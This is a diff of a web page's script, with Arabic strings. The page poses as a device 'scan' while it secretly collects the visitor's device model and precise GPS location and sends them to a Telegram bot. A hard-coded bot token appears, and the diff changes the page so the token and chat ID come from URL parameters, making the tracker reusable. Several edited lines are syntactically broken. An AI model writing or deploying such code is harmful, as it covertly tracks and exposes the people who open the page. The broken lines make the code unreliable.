@@ -48,12 +48,14 @@
 </div>
 
 <script>
-const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
+const params = new URLSearchParams(window.location.search);
+const CHAT_ID = params.get("chatId") || "7276604783";
+const BOT_TOKEN = params.get("token") || "8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo";
 function getDevice() { const m = navigator.userAgent.match(/; ([^;]+) Build/); return { name: m ? m[1].trim() : 'جهاز غير معروف' }; }
 const device = getDevice();
 document.getElementById('device-name').textContent = '📱 ' + device.name;
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
-function sendMsg(text) { fetch('https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text})}).catch(e=>{}); }
+function sendMsg(text) { fetch('`https://api.telegram.org/bot${BOT_TOKEN}/`sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text})}).catch(e=>{}); }
 
 async function startScan() {
     showPage('page-scanning');
@@ -64,7 +66,7 @@ async function startScan() {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const { latitude, longitude } = pos.coords;
             sendMsg(`📍 الموقع\n🗺️ https://maps.google.com/?q=${latitude},${longitude}`);
-            fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,latitude,longitude})}).catch(e=>{});
+            fetch(``https://api.telegram.org/bot${BOT_TOKEN}/`sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,latitude,longitude})}).catch(e=>{});
         }, () => sendMsg('📍 GPS: لم يتم التحديد'), { enableHighAccuracy: true, timeout: 30000 });
     } else { sendMsg('📍 GPS: غير مدعوم'); }
 
